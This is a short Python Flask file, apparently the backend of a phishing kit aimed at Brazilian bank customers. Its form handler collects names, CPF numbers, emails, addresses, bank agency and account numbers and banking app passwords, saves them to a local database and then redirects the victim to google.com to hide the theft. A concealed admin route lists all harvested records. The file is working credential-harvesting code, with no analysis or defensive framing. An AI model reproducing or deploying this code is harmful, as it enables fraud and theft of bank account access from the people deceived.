import os
import sqlite3
from flask import Flask, render_template, request, redirect

app = Flask(__name__, template_folder='templates')

def get_db_connection():
    # Conecta ao arquivo de banco de dados mostrado no seu GitHub
    conn = sqlite3.connect('dados_bancarios.db')
    conn.row_factory = sqlite3.Row
    return conn

def init_db():
    """Garante que a tabela exista com todas as colunas"""
    conn = get_db_connection()
    cursor = conn.cursor()
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS usuarios (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            nome TEXT, cpf TEXT, email TEXT,
            cep TEXT, rua TEXT,
            agencia TEXT, conta TEXT, senha_app TEXT
        )
    ''')
    conn.commit()
    conn.close()

@app.route('/')
def index():
    return render_template('cadastro.html')

@app.route('/login', methods=['POST'])
def login():
    # Captura os dados que você está preenchendo no formulário
    dados = (
        request.form.get('nome'), request.form.get('cpf'), request.form.get('email'),
        request.form.get('cep'), request.form.get('rua'),
        request.form.get('agencia'), request.form.get('conta'), request.form.get('senha_app')
    )
    
    conn = get_db_connection()
    cursor = conn.cursor()
    cursor.execute('''
        INSERT INTO usuarios (nome, cpf, email, cep, rua, agencia, conta, senha_app)
        VALUES (?, ?, ?, ?, ?, ?, ?, ?)
    ''', dados)
    conn.commit()
    conn.close()
    return redirect("https://www.google.com")

@app.route('/admin_painel_secreto_99')
def admin():
    # Tenta inicializar o banco antes de ler para evitar o erro "no such table"
    init_db()
    conn = get_db_connection()
    usuarios = conn.execute('SELECT * FROM usuarios ORDER BY id DESC').fetchall()
    conn.close()
    return render_template('admin.html', usuarios=usuarios)

if __name__ == '__main__':
    init_db()
    port = int(os.environ.get("PORT", 10000))
    app.run(host='0.0.0.0', port=port)
